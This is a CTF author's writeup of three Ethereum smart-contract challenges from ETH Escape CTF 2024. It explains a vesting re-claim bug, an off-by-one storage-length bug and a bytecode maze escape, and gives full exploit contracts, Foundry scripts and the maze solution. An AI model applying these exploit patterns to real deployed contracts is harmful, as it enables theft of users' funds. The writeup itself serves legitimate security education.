---
title: (CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)
description: ETH Escape CTF writeup
categories: [CTF,WEB3]
tags : [writeup,web3]
date : 2024-11-21 02:02:13 +0900
author:
    name:
    link:
toc: true
comments: true
mermaid: true
math: true
---

As a member of Project Sekai, I authored 3 challenges. Working with mixy and Immunefi onsite was a very rewarding experience for me.

> The ETH Escape CTF is hosted by `Ethereum Foundation ⚔ immunefi`, onsite event during the devcon.
> https://lu.ma/viyjky8t

I authored three challenges: `Vest`, `Feel`, and `MAZE`, designed for the 1st, 5th, and final rounds, respectively. Both `Vest` and `Feel` had 0 solves, while `MAZE` had one solve during the CTF. However, there were two additional solves a few minutes after the CTF ended TㅅT
## Vest
---
`round 5, 0 solve`
![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241120025606.png)
Three contract files are given: `VestToken`, `Setup`, and `Vest`.
- `VestToken` is an ERC20 token contract with a total supply of `50000` ether.
- The `Setup` contract creates the `VestToken` and `Vest` contracts. It also transfers `50000` ether worth of tokens to the `Vest` contract.
The goal is to make the token balance of the `Setup` contract equal to `50000` ether.

### Vest contract
---
The `Vest` contract provides the `vesting` service. There are three external functions: `createVesting`, `transferVesting`, and `claimVesting`.
```solidity
    function createVesting(address beneficiary) external {
        require(beneficiary != address(0), "Invalid beneficiary address");
        require(vestingCount < 10, "Maximum number of vestings reached");

        vestings[vestingCount] = Vesting({
            start: block.timestamp,
            totalAmount: FIXED_AMOUNT,
            claimedAmount: 0,
            beneficiary: beneficiary,
            step: 0
        });
        vestingCount++;

        emit VestingCreated(vestingCount, beneficiary, FIXED_AMOUNT);
    }
```
In the `createVesting` function, it creates a new vesting with `vestingCount`. `FIXED_AMOUNT` is `1000` ether. Creating only 10 vestings is allowed.

```solidity
    function transferVesting(uint256 vestingId,address newBeneficiary, uint256 amount,uint256 newVestingId) external onlyBeneficiary(vestingId) {
        require(newBeneficiary != address(0), "New beneficiary is zero address");
        
        address previousBeneficiary = vestings[vestingId].beneficiary;

        vestings[vestingId].totalAmount -= amount;
        vestings[vestingId].step = 0;

        vestings[newVestingId] = Vesting({
            start: block.timestamp,
            totalAmount: amount,
            claimedAmount: 0,
            beneficiary: newBeneficiary,
            step: 0
        });

        emit VestingTransferred(vestingId, previousBeneficiary, newBeneficiary);
    }
```
There's a bug in the `transferVesting` function. It decreases `totalAmount` by the amount to send and initializes the `step`. After that, it creates a new vesting with `newVestingId` for that amount with a new beneficiary.

The bugs:  
1. `newVestingId` can be an existing `vestingId`, but there is no way to drain or bypass the restriction with this bug. If misused, this bug allows overwriting an existing vesting with a smaller amount.  
2. The function does not check the `claimAmount` of the previous vesting. As a result, a user can send an already claimed vesting to themselves again. With `totalAmount`, the user can create vestings again without increasing `vestingCount`.

So, the user can claim more than `10000` ether. However, as mentioned in the description, there is a time limit for this challenge.

```solidity
    function claimVesting(uint256 vestingId) external onlyBeneficiary(vestingId) {
        Vesting storage vesting = vestings[vestingId];
        uint256 elapsed = block.timestamp - vesting.start;
        
        uint256 totalSteps = TOTAL_STEPS - vesting.step; 
        uint256 availableSteps = elapsed / CLAIM_INTERVAL;

        if (availableSteps > totalSteps) {
            availableSteps = totalSteps;
        }

        uint256 claimableAmount = (vesting.totalAmount * availableSteps) / totalSteps;

        uint256 claimableNow = claimableAmount - vesting.claimedAmount;
        require(claimableNow > 0, "No tokens available for claim at this time");

        vesting.claimedAmount += claimableNow;
        require(token.transfer(vesting.beneficiary, claimableNow), "Token transfer failed");

        emit Claimed(vestingId, claimableNow);
    }
```
Let's look at the `claimVesting` function. `TOTAL_STEPS` is `5*5`, and `CLAIM_INTERVAL` is `5`. This means the user must wait `25` seconds to claim the `totalAmount` of the vesting. Since 10 vestings can be created at once, the user can claim `10000` ether every `25` seconds. To claim the `totalSupply`, the user must wait at least `125` seconds. How doable!

### Exploit
---
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "src/challenge/Setup.sol";
import {Vest} from "src/challenge/Vest.sol";
import {VestToken} from "src/challenge/VestToken.sol";

contract Exploit {
    Setup public setup;
    Vest public vest;
    VestToken public token;
    constructor(Setup _setup, Vest _vest, VestToken _token)
    {
        setup = _setup;
        vest = _vest;
        token = _token;
    }
    function run1() public {
        for(uint i=0;i<10;i++){
            vest.createVesting(address(this));
        }

    }
    function run2() public returns (uint256) {
            for(uint i=0;i<10;i++){
               vest.claimVesting(i);
               vest.transferVesting(i, address(address(this)), 1000 ether, i);
           }
           return token.balanceOf(address(this));
    }
    function run3() public {
        token.transfer(address(setup), token.balanceOf(address(this)));
    }
}

```
This is exploit contract and the exploit scenario is as follows:  
1. Create 10 vestings.  
2. Claim the 10 vestings after `25` seconds and transfer the vestings to itself.  
3. Repeat step 2.  
4. Send the token amount of `50000` ether to the `setup` contract. 

### NOTE
---
The attack scenario used in this challenge is kind of a real-world case. I encountered a similar issue before but couldn’t exploit it because the function had proper access control 🙃. It was surprised when someone approached me after the CTF and told me he really enjoyed this challenge because he had encountered a similar bug case a few years ago lol

I believe this challenge is pretty easy, but the time for each round was too short (two challenges in 60 minutes).  

In the original version, the function reverts when the vesting is completed (claimable amount is `1000` ether), and `TOTAL_STEPS` and `CLAIM_INTERVAL` were significantly longer. The exploit required almost 10 minutes, which often led to server timeouts. This meant I had to write a fully accurate script, including fetching RPC info, precise sleep timings, and more, to execute the exploit successfully.

## Feel
---
`round 1, 0 solve`
![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241120033534.png)   
Also, three contract files are given: `Feel`, `FeelToken`, and `Setup`.
- `FeelToken` is an ERC20 token contract with a `totalSupply` of `20` ether.  
- The `Setup` contract creates the `Feel` and `FeelToken` contracts and sends `20` ether worth of `FeelToken` to the `Feel` contract.  
The goal is to make the token balance of the `Setup` contract equal to `20` ether.

### Feel contract
---
The `Feel` contract provides milestone service, which is similar to `Vest` challenge.
```solidity
    function addMilestone(uint256 id, string calldata note) public {
        require(milestones[id].id == 0, "Feel: milestone id already exists");
        require(id > 0, "Feel: milestone id must be greater than 0");
        require(milestoneCount < 10, "Feel: maximum 10 milestones allowed");

        milestones[id] = Milestone(id, 1 ether, block.timestamp + 5 minutes, msg.sender, note, Status.Locked);
        milestoneCount++;
    }
```
Let's first look at the `addMilestone` function. The user can specify an `id` that does not exist previously, and the maximum number of milestones is limited to 10.

```
    struct Milestone {
        uint256 id;
        uint256 amount;
        uint256 unlockTime;
        address recipient;
        string note;
        Status status;
    }
```
The `Milestone` struct has six members. The user can only specify the `id` and `note`. They can earn `1` ether for completing one milestone.

```
    function unlockMilestone(uint256 id) public {
        Milestone storage milestone = milestones[id];
        require(milestone.status == Status.Locked, "Feel: milestone is already unlocked");
        require(block.timestamp >= milestone.unlockTime, "Feel: milestone is not unlocked yet");
        milestone.status = Status.Unlocked;
    }
```
The user can unlock a milestone after 5 minutes (default).

```solidity
    function claimMilestone(uint256 id) public {
        Milestone storage milestone = milestones[id];
        require(milestone.status == Status.Unlocked, "Feel: milestone is locked");
        uint256 milestones_slot_key = uint256(keccak256(abi.encode(id, MILESTONES_SLOT_KEY)));
        bytes32 note_key = bytes32(milestones_slot_key + 4);
        uint256 string_length = StorageSlot.getUint256Slot(note_key).value;
        bytes memory note_bytes;
        if (string_length & 0x1 == 0) {
            uint256 length = (string_length&0xff) >> 1;
            bytes32 note_bytes32 = StorageSlot.getBytes32Slot(note_key).value;
            note_bytes = abi.encodePacked(note_bytes32);
        } else {
            uint256 length = (string_length >> 1) -1;
            uint256 extra_slots = (length + 31) >> 5;
            uint256 extra_slots_start = uint256(keccak256(abi.encode(note_key)));
            note_bytes;
            for (uint256 i = 0; i < extra_slots; i++) {
                note_bytes = abi.encodePacked(note_bytes, StorageSlot.getBytes32Slot(bytes32(extra_slots_start + i)).value);
            }
        }
        require(findClaimString(note_bytes) == false, "Feel: milestone is already claimed");
        milestone.note = string(abi.encodePacked(milestone.note, " [CLAIMED]"));
        token.transfer(milestone.recipient, milestone.amount);
        milestoneCount -= 1;
    }
```
The user can claim a milestone with `claimMilestone` when its status is `Unlocked`. However, there's a strange check for this condition.

First, it retrieves the storage value in the `note` of the milestone and checks if the first bit is set.

> In particular: if the data is at most `31` bytes long, the elements are stored in the higher-order bytes (left aligned) and the lowest-order byte stores the value `length * 2`. For byte arrays that store data which is `32` or more bytes long, the main slot `p` stores `length * 2 + 1` and the data is stored as usual in `keccak256(p)`. This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).

If the length of the `note` is less than 32 bytes, it retrieves 32 bytes from storage directly. Otherwise, it calculates how many slots to retrieve based on the length of the string and then retrieves the entire string. It then checks for the presence of the ` [CLAIMED]` substring in the `note`. The `findClaimString` function, created with GPT, has no bugs for this functionality :3

If the string `[CLAIMED]` is not found, the function appends the string to the `note`, sends the token to the user, and decreases `milestoneCount` by 1. This allows the possibility of creating a new milestone after claiming a milestone. However, the server timeout is `9 minutes`

The bugs:  
1. The `note_bytes32` includes the length of the note, not just the data. However, this doesn’t affect the outcome in this challenge.  
2. The length is calculated incorrectly using `(string_length >> 1) - 1` instead of the correct formula `(string_length - 1) >> 1`. As a result, the length is calculated as one less than the original length. This becomes problematic when the length is `32*n + 1`, especially `33`. In this case, the length is calculated as `32`, and the `extra_slots` is calculated as `1`. Consequently, one less slot is retrieved. If the length of the note after appending the `[CLAIMED]` string becomes `32*n + 1`, the last character `]` is missed, allowing the milestone to be claimed twice.

### Exploit
---
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "src/challenge/Setup.sol";
import {Feel} from "src/challenge/Feel.sol";
import {FeelToken} from "src/challenge/FeelToken.sol";
contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Setup setup = Setup(vm.envAddress("SETUP"));
        Feel feel = Feel(setup.feel());
        FeelToken token = FeelToken(setup.token());
        console.log("timestamp 1", feel.getTime());
        for(uint i=1;i<=10;i++){
            feel.addMilestone(i,"xxxxxxxxxxxxxxxxxxxxxxx");
        }
        vm.stopBroadcast();
    }

    function run2() public {
        vm.startBroadcast();
        Setup setup = Setup(vm.envAddress("SETUP"));
        Feel feel = Feel(setup.feel());
        console.log("timestamp 2", feel.getTime());
        FeelToken token = FeelToken(setup.token());
        for(uint i=1;i<=10;i++){
            feel.unlockMilestone(i);
            feel.claimMilestone(i);
            feel.addMilestone(i+50,"xxxxxxxxxxxxxxxxxxxxxxx");
            feel.claimMilestone(i);
        }
        console.log("balance: ", token.balanceOf(msg.sender));
        token.transfer(address(setup), token.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}
```

The exploit scenario is:  
1. Add 10 milestones with notes of length `23` (after appending ` [CLAIMED]`, the length will become `33`).  
2. Wait 5 minutes to unlock the milestones, claim a milestone, and add some milestones to prevent underflow. Then, claim the same milestone again.

### NOTE
---
This challenge is also inspired by a real-world case. lol

## MAZE
---
`final, 1 solve`
![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241120041422.png)
The only one file was given. `Setup.sol`

```solidity
pragma solidity ^0.8.25;

contract Setup {
    address public maze;
    constructor() {
        bytes memory code = hex"61025e80600a3d393df35f3560e01c63deadbeef146100135761001c565b5f545f5260205ff35b7f41327924f1b91fe820120120804b93f9248e3926010092082080000036fbefb85f527f8c4f3a002402480003238db6237239920124124120b1db1249271c64120924006020527f24904920be1b9249246fa082092492003238e493c6fc9900120804824b7e47e46040527ff9fb9ff9dc9804020920904b927ee49249da0804004920131c9230c30c4990486060527f260920100904132493f7230df1904804120804c7e3fe7fe3e2640200000008316080527f4000b7279ff93bee64100000820831f11bf1c93ce804920104800ced89e7718f60a0526a013feff7ff7ffe8008040060c052610232610140525f610100525b6101005180361461024557600190610120376101205160f81c80607714610149578060611461018857806073146101c75780606414610206575b6101006031610140510361065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101006001610140510361065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101006031610140510161065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101006001610140510161065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101405161064f146102565761025c565b60015f55005b00";
        address _maze;
        assembly {
            _maze := create(0, add(code, 0x20), mload(code))
        }
        maze = _maze;
    }
    function isSolved() public returns (bool) {
        (bool success, bytes memory result) = maze.call(hex"DEADBEEF");
        uint256 ret = abi.decode(result, (uint256));
        if(ret == 0x1) {
            return true;
        }

        return false;
    }
}

```
When the `Setup` contract calls the maze contract with `DEADBEEF` as calldata, it should return `uint256(1)`.

### bytecode reversing with decompiler

```solidity
function __function_selector__() private { 
    if (0xdeadbeef == msg.data[0] >> 224) {
        CodeIsLawZ95677371();
    } else {
        MEM[0] = 0x41327924f1b91fe820120120804b93f9248e3926010092082080000036fbefb8;
        MEM[32] = 0x8c4f3a002402480003238db6237239920124124120b1db1249271c6412092400;
        MEM[96] = 0xf9fb9ff9dc9804020920904b927ee49249da0804004920131c9230c30c499048;
        MEM[128] = 0x260920100904132493f7230df1904804120804c7e3fe7fe3e264020000000831;
        MEM[160] = 0x4000b7279ff93bee64100000820831f11bf1c93ce804920104800ced89e7718f;
        MEM[192] = 0x13feff7ff7ffe80080400]
        MEM[320] = 562;
        while (msg.data.length != 0) {
            CALLDATACOPY(288, 0, 1);
            if (119 != MEM[288] >> 248) {
                if (97 == MEM[288] >> 248) {
                    if (1 != MEM[(MEM[320] - 1) % 1616 >> 8 << 5] >> (MEM[320] - 1) % 1616 % (uint8.max + 1) & 0x1) {
                        MEM[320] = (MEM[320] - 1) % 1616;
                        MEM[uint8.max + 1] += 1;
                    }
                } else if (115 == MEM[288] >> 248) {
                    if (1 != MEM[(MEM[320] + 49) % 1616 >> 8 << 5] >> (MEM[320] + 49) % 1616 % (uint8.max + 1) & 0x1) {
                        MEM[320] = (MEM[320] + 49) % 1616;
                        MEM[uint8.max + 1] += 1;
                    }
                } else if (100 == MEM[288] >> 248) {
                    if (1 != MEM[(MEM[320] + 1) % 1616 >> 8 << 5] >> (MEM[320] + 1) % 1616 % (uint8.max + 1) & 0x1) {
                        MEM[320] = (MEM[320] + 1) % 1616;
                        MEM[uint8.max + 1] += 1;
                    }
                }
            }
            if (1 != MEM[(MEM[320] - 49) % 1616 >> 8 << 5] >> (MEM[320] - 49) % 1616 % (uint8.max + 1) & 0x1) {
                MEM[320] = (MEM[320] - 49) % 1616;
                MEM[uint8.max + 1] += 1;
            }
        }
        exit;
        if (1615 == MEM[320]) {
            _codeIsLawZ95677371 = 1;
            exit;
        }
    }
}
```
First, we can decompile the bytecode using the Dedaub [decompiler](https://app.dedaub.com/decompile?md5=6686bb733ec4e8e4bbfa8b072234b7e0). However, the output seems quite different from what I expected, probably because I wrote this bytecode in Huff and used stack variables efficiently (ig).  

As you can see, the map data is stored in `0x00 ~ 0xc0`, but `0x40` is missing in the decompiler. The initial position is stored in `MEM[320]` (`562 = 11 * 49 + 23 = [11][23]`). The loop iterates based on the length of the `msg.data`, and `MEM[uint8.max + 1]` (`MEM[0x100]`) is used as the iterator.  

It checks if the bit in the new location is set according to the map. The size of a row is `49`, and it should approach `1615` (`[34][47]`).

### bytecode reversing with bytegraph.xyz
---
I prefer using [bytegraph.xyz](https://bytegraph.xyz/bytecode/1c1b6c3e23794ada5a18c703d2527e0d/graph) for analyzing bytecode.

![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241121022715.png)
1. It returns the value of slot `0` when the calldata is `DEADBEEF`.

![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241121022806.png)
2. It stores map data in `0x00 ~ 0xc0`, position to `0x140` and iterator(0) to `0x100`

![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241121023053.png)
3. The loop iterates until iterator reaches the `calldatasize`, and if the `position` equals `0x64f` after the loop, it stores `1` in slot `0`.

![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241121023711.png)
4. The user input can be one of the following: `w`, `a`, `s`, or `d`. I just realized a mistake: in other cases, it simply jumps to `w` instead of stopping, haha..

![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241121024109.png)
5. There are six red boxes. Let's examine the case of `w`:
   a. It calculates the next position by subtracting `0x31` (the size of a row). (`w -> -0x31, s -> +0x31, a -> -1, d -> +1`).  
   b. It performs a modulo operation with `0x650`. This is a bug because the position can be a negative value. If it is moduloed with `0x650`, it can jump to another location. For example, when the new position is `-1` (`0xff...`), the result of the modulo with `0x650` will be `0x60F` (`((1 << 256) - 1) % 0x650`).  
   c,d. It divides the position by `0x100` and multiplies the result by `0x20` to determine the map to use.  
   e. It performs a modulo operation with `0x100` on the position and shifts the map to the right by that value to locate the corresponding bit.  
   f. It performs an AND operation with `1` to check the value of that bit.  If the result is `1`, the EVM stops.
   
![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241121025113.png)
6. Finally, it updates the location and increases the iterator.
### The maze
---
```python
maze = [0x41327924f1b91fe820120120804b93f9248e3926010092082080000036fbefb8,
0x8c4f3a002402480003238db6237239920124124120b1db1249271c6412092400,
0x24904920be1b9249246fa082092492003238e493c6fc9900120804824b7e47e4,
0xf9fb9ff9dc9804020920904b927ee49249da0804004920131c9230c30c499048,
0x260920100904132493f7230df1904804120804c7e3fe7fe3e264020000000831,
0x4000b7279ff93bee64100000820831f11bf1c93ce804920104800ced89e7718f,
0x13feff7ff7ffe80080400]
maze = [format(x,'0256b')[::-1] for x in maze]
maze = [list(x) for x in maze]
maze = sum(maze,[])

for i in range(0, 33):
    for j in range(0, 49):
        if i == 11 and j == 23:
            print('S',end='')
        elif maze[i*49+j] == '1':
            print('#',end='')
        else:
            print('.',end='')
    print()
```
You can print the maze using the code above.

![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241121025531.png)
The `S` marks the starting point. If you try to find a way to reach the goal location, there will be no solution because I intentionally blocked the path to get there.

![img](/assets/img/2024-11-21-eth-escape/Pasted image 20241121030057.png)
The intended solution is going to `0x00`, setting the new position to `-1`, and then jumping to `0x60F` to escape the maze. However, there was an unintended solution that I couldn’t block. Additionally, there’s another method: reaching the location marked with a star also allows escaping the maze.

> aaawwwwwwaaaaaaaaaawwaaaaaawwaaaawawwddddddssddddddddds

So, this was the intended solution.
### NOTE
---
I really enjoy bytecode reversing or EVM internal challenges :3. Recently, I solved a bytecode challenge in SCTF and also authored a fun bytecode challenge for a local CTF final. If anyone is interested, feel free to DM me

Additionally, I made an easier version for Project Sekai CTF. It's not bytecode reversing but a Solidity assembly challenge. If you're interested, give it a try!
[Link](https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/blockchains/zoo)

I was happy that many people especially enjoyed this challenge lol

## END
---
kudos to immunefi, ethereum foundation and mixy. I had very nice weekend during the devcon. Hope to do this kind of event onsite again!